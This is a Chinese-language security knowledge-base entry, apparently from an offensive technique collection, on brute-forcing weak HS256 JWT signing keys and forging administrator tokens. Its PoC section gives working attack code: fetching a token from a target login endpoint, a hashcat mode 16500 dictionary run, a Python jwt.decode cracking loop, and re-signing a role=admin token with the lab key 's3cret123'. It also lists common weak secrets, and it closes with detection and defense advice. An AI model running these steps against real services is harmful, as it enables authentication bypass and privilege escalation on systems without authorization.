---
id: web-generic-jwt-weak-hmac-key-bruteforce
title: HS256 弱密钥字典爆破后签发任意 JWT
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-weak-key-bruteforce
aliases:
- JWT 弱密钥爆破
- HS256 密钥爆破
- hashcat 16500
- JWT secret 字典
- jwt-secrets
tags:
- jwt
- hs256
- brute-force
- weak-key
- hashcat
- authentication-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:37:25+08:00'
  notes: 已对照原文与图 10-11 核对：HS256 离线字典爆破、hashcat -m 16500、Python 逐条 decode、靶场密钥 s3cret123 命中后重签 admin token，均与原文一致；PoC 未在本机执行。
---

## 一句话结论

HS256 的签名密钥是共享 secret，若为弱口令或常见默认值，攻击者用一份合法 JWT 离线字典爆破出密钥，即可签发任意 `role=admin` 的令牌。

## 原理

- HS256 = HMAC-SHA256(header.payload, secret)。签名算法公开，给定 token 即可对候选密钥逐个计算 HMAC 并与签名比对。
- 验证不需要在线请求，全部可离线完成；hashcat 模式 16500 对 JWT 有原生支持，可用 GPU 高速跑 rockyou 等字典。
- 常见弱密钥包括 `secret`、`password`、`123456`、`changeme`、`s3cret123`、`jwt_secret` 等，以及项目名/环境名等定制词。
- 一旦命中，攻击者掌握签名能力，可任意修改 `sub`、`role`、`exp` 并重新签名；后续所有基于 JWT 的授权都可绕过。
- 该问题与算法实现无关，纯粹是密钥强度不足/复用默认值。

## 触发条件

- 应用使用 HS256/HS384/HS512。
- 密钥为弱口令、默认示例值、项目名或可从字典猜到的字符串。
- 攻击者能获取至少一个合法 JWT（登录接口、前端存储、日志、分享链接等）。

## 利用步骤

1. 获取一个合法 HS256 JWT，保存为文件（末尾不要多换行）。
2. 用 hashcat 字典模式爆破：`-m 16500 -a 0`。
3. 或使用纯 Python 脚本逐条 `jwt.decode` 验证，便于集成到自动化流程。
4. 命中密钥后，用该密钥签发 `role=admin` 的新 token。
5. 访问管理员接口验证。

## PoC

hashcat：

```bash
TOKEN=$(curl -s -X POST http://target/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")
printf '%s' "$TOKEN" > jwt.txt
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force
```

纯 Python：

```python
import jwt
token = open("jwt.txt").read().strip()
for secret in open("jwt-secrets.txt", encoding="utf-8", errors="ignore"):
    secret = secret.strip()
    if not secret:
        continue
    try:
        jwt.decode(token, secret, algorithms=["HS256"])
        print("KEY FOUND:", secret)
        break
    except Exception:
        pass
```

命中后签发：

```python
import jwt
print(jwt.encode({"sub": "admin", "role": "admin"}, "s3cret123", algorithm="HS256"))
```

## 变体与关联

- 变体：HS384/HS512 同样可爆破；密钥为“项目名+年份”“公司缩写+123”等定制词时，用目标信息生成字典；hashcat 规则模式可扩展变形。
- 关联：[[web-generic-jwt-alg-none-bypass]]（无需密钥直接伪造）；[[web-generic-jwt-rs256-hs256-confusion]]（把公钥变成 HMAC 密钥）；[[web-generic-jwt-kid-injection]]（通过 kid 控制密钥来源）。
- 边界：强随机 256 位密钥无法在可行时间内爆破；若服务端轮换密钥/使用非 HMAC 算法，本手法不成立。

## 检测与防御

- 检测：大量离线尝试无法从服务端日志看到，但可通过密钥强度审计发现；JWT 签名异常、角色字段与账号不符；token 由非签发端生成。
- 防御：使用至少 256 位随机密钥（`secrets.token_hex(32)`）；按环境/租户隔离密钥并定期轮换；不要把密钥写入代码仓库；监控异常 token 与角色变更。
